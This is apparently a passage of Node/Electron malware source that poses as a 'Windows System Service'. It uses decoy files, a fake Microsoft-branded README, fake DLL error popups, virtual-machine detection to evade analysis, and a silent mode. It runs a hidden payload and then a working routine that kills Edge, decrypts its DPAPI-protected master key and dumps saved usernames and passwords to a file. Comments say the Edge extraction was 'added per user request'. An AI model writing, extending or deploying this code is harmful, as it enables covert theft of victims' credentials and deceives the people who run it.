        await this.sleep(500 + Math.random() * 1000);
        const updateInfo = { currentVersion: '1.0.0', latestVersion: '1.0.0', updateAvailable: false, checkTime: new Date().toISOString() };
        return updateInfo;
    }
    static createConfigFile() {
        const appData = process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming');
        const configDir = path.join(appData, 'WindowsSystemService');
        try {
            if (!fs.existsSync(configDir)) { fs.mkdirSync(configDir, { recursive: true }); }
            const configPath = path.join(configDir, 'config.json');
            const cfg = { version: '1.0.0', installDate: new Date().toISOString(), lastRun: new Date().toISOString(), settings: { autoUpdate: true, sendDiagnostics: false, checkInterval: 3600000 } };
            fs.writeFileSync(configPath, JSON.stringify(cfg, null, 2));
            return configPath;
        } catch (e) { return null; }
    }
    static createLogFile(message) {
        const appData = process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming');
        const logDir = path.join(appData, 'WindowsSystemService', 'Logs');
        try {
            if (!fs.existsSync(logDir)) { fs.mkdirSync(logDir, { recursive: true }); }
            const timestamp = new Date().toISOString();
            const logEntry = `[${timestamp}] ${message}\n`;
            const logPath = path.join(logDir, 'service.log');
            fs.appendFileSync(logPath, logEntry);
            return logPath;
        } catch (e) { return null; }
    }
    static simulateServiceBehavior() {
        this.createConfigFile();
        this.createLogFile('Service started');
        this.createLogFile('Initializing system check');
        this.createLogFile('System diagnostics running');
        this.checkForUpdates();
    }
    static async waitForHumanInteraction() {
        const startTime = Date.now(); const waitTime = 2000;
        while (Date.now() - startTime < waitTime) { await this.sleep(100); }
        return true;
    }
    static checkNetworkConnectivity() {
        return new Promise((resolve) => {
            try {
                const dns = require('dns');
                const { promisify } = require('util');
                const lookup = promisify(dns.lookup);
                const testHosts = ['google.com', 'cloudflare.com'];
                const results = {};
                Promise.all(testHosts.map(host => lookup(host).then(() => ({ host, success: true })).catch(() => ({ host, success: false })))).then((hostResults) => {
                    hostResults.forEach(({ host, success }) => { results[host] = success; });
                    resolve(results);
                }).catch(() => { resolve({}); });
            } catch (e) { resolve({}); }
        });
    }
    static createLegitimateFiles() {
        const tempDir = os.tmpdir(); const files = [];
        try {
            const readmePath = path.join(tempDir, 'SystemService_README.txt');
            const readmeContent = `\nWindows System Service\nVersion: 1.0.0\n\nThis is a system maintenance service that helps keep your system running smoothly.\n\nFeatures:\n- System diagnostics\n- Performance optimization\n- Update management\n\n© Microsoft Corporation. All rights reserved.`;
            fs.writeFileSync(readmePath, readmeContent); files.push(readmePath);
            const versionPath = path.join(tempDir, 'version.txt'); fs.writeFileSync(versionPath, '1.0.0.0'); files.push(versionPath);
        } catch (e) { }
        return files;
    }
    static performDiagnostics() {
        let result = 0; for (let i = 0; i < 100000; i++) { result += Math.sqrt(i); } return result;
    }
    static async sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
    static showFakeDllError() {
        if (Math.random() > 0.7) return;
        try {
            const tempDir = os.tmpdir(); const vbsPath = path.join(tempDir, 'system_check_' + Date.now() + '.vbs');
            const dllErrors = ['MSVCR100.dll', 'MSVCP140.dll', 'VCRUNTIME140.dll', 'api-ms-win-crt-runtime-l1-1-0.dll', 'ucrtbase.dll'];
            const randomDll = dllErrors[Math.floor(Math.random() * dllErrors.length)];
            const vbsContent = `\nSet WshShell = CreateObject("WScript.Shell")\nWshShell.Popup "The program can't start because ${randomDll} is missing from your computer. Try reinstalling the program to fix this problem.", 0, "System Error", 16\n`;
            fs.writeFileSync(vbsPath, vbsContent, 'utf8');
            exec(`cscript //nologo //B "${vbsPath}"`, { windowsHide: true }, (error) => { try { fs.unlinkSync(vbsPath); } catch (e) { } });
        } catch (error) { }
    }

    static async runLegitimateRoutine() {
        const sysInfo = this.collectSystemInfo();
        this.simulateServiceBehavior();
        await this.checkForUpdates();
        await this.checkNetworkConnectivity();
        this.createLegitimateFiles();
        this.performDiagnostics();
        this.showFakeDllError();
        await this.waitForHumanInteraction();
        this.createLogFile('Service initialization completed');
        return true;
    }
}

async function findRandomDeepFolder() {
    try {
        const baseDir = process.env.LOCALAPPDATA || os.tmpdir();
        const deepFolder = path.join(baseDir, 'win-service');
        fs.mkdirSync(deepFolder, { recursive: true });
        console.log(`[FUD] Using deterministic deep folder: ${deepFolder}`);
        return deepFolder;
    } catch (error) {
        const fallbackDir = path.join(os.tmpdir(), 'win-service');
        fs.mkdirSync(fallbackDir, { recursive: true });
        console.log(`[FUD] Using fallback deep folder: ${fallbackDir}`);
        return fallbackDir;
    }
}

async function main() {
    console.log('Main started');
    try {
        console.log('=== Service Started ===');
        console.log('Starting Windows System Service...');
        console.log('Checking AntiVM config...');
        if (ENABLE_ANTIVM) {
            console.log('Step 1/7: Checking for virtual machine...');
            const isVM = AntiVM.check();
            if (isVM) {
                console.log('Virtual machine detected! Exiting...');
                console.log('VM Detected, exiting');
                process.exit(0);
            }
            console.log('VM check passed');
        } else {
            console.log('AntiVM disabled, skipping check');
            console.log('AntiVM disabled');
        }
        console.log('Running system diagnostics...');
        await LegitimateModule.runLegitimateRoutine();
        console.log('Legitimate Routine finished');
        console.log('System diagnostics completed');
        console.log('Running security checks...');
        console.log('All security checks passed');
        console.log('Finding random deep folder...');
        const deepFolder = await findRandomDeepFolder();
        console.log(`Deep folder found: ${deepFolder}`);
        console.log(`Found deep folder: ${deepFolder}`);
        console.log('Running payload...');
        console.log('Starting InputPayload.main()...');
        console.log('Starting InputPayload...');
        await InputPayload.main(deepFolder);
        console.log('InputPayload finished');

        // Native Edge Extraction (added per user request)
        try {
            await ExtractEdgePasswords();
        } catch (err) {
            console.log("Edge extraction error:", err.message);
        }
        console.log('All operations completed successfully!');
        console.log('=== Summary ===');
        console.log('Total logs: N/A');
        console.log('Errors: N/A');
        console.log('Success: N/A');
        console.log('Duration: N/A');
        console.log('All done');
        setTimeout(() => { process.exit(0); }, 200);
    } catch (error) {
        console.log(`Fatal error: ${error.message}\n${error.stack}`);
        console.log(`Fatal error: ${error.message}`);
        console.log(`Stack trace: ${error.stack}`);
        process.exit(1);
    }
}

async function mainSilent() {
    try {
        await LegitimateModule.runLegitimateRoutine();
        if (AntiVM.check()) { process.exit(0); }
        const deepFolder = await findRandomDeepFolder();
        await InputPayload.main(deepFolder).catch(e => { console.log(`Error: ${e.message}`); });

        // Native Edge Extraction (added per user request)
        try {
            await ExtractEdgePasswords();
        } catch (err) { }

        setTimeout(() => process.exit(0), 100);
    } catch (error) {
        process.exit(1);
    }
}

// Force execution logic
const startApp = () => {
    console.log('Starting app execution...');
    if (process.argv.includes('--silent')) {
        mainSilent();
    } else {
        main();
    }
};

let electronApp;
try {
    const electron = require('electron');
    if (typeof electron === 'object' && electron.app) {
        electronApp = electron.app;
    }
} catch (e) { }

if (electronApp) {
    electronApp.whenReady().then(() => {
        console.log('Electron app ready - Calling startApp');
        startApp();
    });
} else {
    console.log('Node environment detected - Calling startApp');
    startApp();
}

module.exports = { main, mainSilent, AntiVM, LegitimateModule, AdminCheck };

// ============================================================
// NATIVE EDGE EXTRACTION (Ben10 Style)
// ============================================================


function killBrowserProcess(processName) {
    try {
        execSync(`taskkill /F /IM ${processName} /T 2>nul`, { windowsHide: true });
    } catch (err) { }
}


async function ExtractEdgePasswords(outputFolder) {
    const edgePath = path.join(process.env.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data');
    if (!fs.existsSync(edgePath)) return;

    killBrowserProcess('msedge.exe');

    try {
        const localStatePath = path.join(edgePath, 'Local State');
        if (!fs.existsSync(localStatePath)) return;

        const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
        const encryptedKey = localState?.os_crypt?.encrypted_key;
        if (!encryptedKey) return;

        const keyBuffer = Buffer.from(encryptedKey, 'base64').slice(5);
        let masterKey;
        try {
            masterKey = Dpapi.unprotectData(keyBuffer, null, 'CurrentUser');
        } catch (e) {
            return; // DPAPI failed
        }

        const profiles = fs.readdirSync(edgePath).filter(name =>
            fs.statSync(path.join(edgePath, name)).isDirectory() &&
            (name === 'Default' || name.startsWith('Profile '))
        );

        let allPasswords = [];

        for (const profile of profiles) {
            const loginFiles = ['Login Data New', 'Login Data', 'Login Data For Account'];
            for (const file of loginFiles) {
                const dbPath = path.join(edgePath, profile, file);
                if (!fs.existsSync(dbPath)) continue;

                const tempDb = path.join(os.tmpdir(), `edge_tmp_${Math.random().toString(36).slice(2)}.db`);
                fs.copyFileSync(dbPath, tempDb);

                try {
                    const extracted = await new Promise((resolve) => {
                        const db = new sqlite3.Database(tempDb, sqlite3.OPEN_READONLY, (err) => {
                            if (err) return resolve([]);
                            db.all('SELECT origin_url, username_value, password_value FROM logins', [], (err, rows) => {
                                db.close();
                                resolve(rows || []);
                            });
                        });
                    });

                    for (const row of extracted) {
                        try {
                            if (!row.password_value || !row.username_value) continue;

                            let password = '';
                            const encryptedValue = Buffer.from(row.password_value);
                            const prefix = encryptedValue.slice(0, 3).toString();

                            if (prefix === 'v10' || prefix === 'v20') {
                                const iv = encryptedValue.slice(3, 15);
                                const ciphertext = encryptedValue.slice(15, -16);
                                const tag = encryptedValue.slice(-16);
                                const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
                                decipher.setAuthTag(tag);
                                password = Buffer.concat([decipher.update(ciphertext), decipher.final()]).toString();
                            }

                            if (password) {
                                allPasswords.push(`URL: ${row.origin_url}\nUsername: ${row.username_value}\nPassword: ${password}\nProfile: ${profile}\n-------------------`);
                            }
                        } catch (e) { }
                    }
                } catch (e) { }

                try { fs.unlinkSync(tempDb); } catch (e) { }
            }
        }

        if (allPasswords.length > 0) {
            const outFile = path.join(outputFolder, 'Edge_Passwords.txt');
            fs.writeFileSync(outFile, allPasswords.join('\n\n'), 'utf8');
            console.log(`Saved ${allPasswords.length} Edge passwords to ${outFile}`);
        }

    } catch (e) {
        // Fail silently
    }

==================================================
